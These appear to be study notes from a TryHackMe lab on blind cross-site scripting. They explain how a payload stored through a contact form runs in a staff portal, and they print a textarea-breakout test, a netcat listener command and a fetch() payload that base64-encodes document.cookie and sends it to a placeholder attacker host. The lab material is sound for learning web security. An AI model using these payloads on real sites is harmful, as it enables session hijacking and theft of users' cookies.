Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**Example Scenario:**  
  
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

**Potential Impact:**  
  
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

How to test for Blind XSS:

When testing for Blind XSS vuln, you need to ensure your playload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [](https://github.com/mandatoryprogrammer/xsshunter-express) [XSS Hunter Express (opens in new tab)](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.


![[Pasted image 20260509222509.png]]

![[Pasted image 20260509222517.png]]

`</textarea><script>alert('THM');</script>`
`nc -n -l -v -p 9001`


`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

Let’s break down the payload:

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.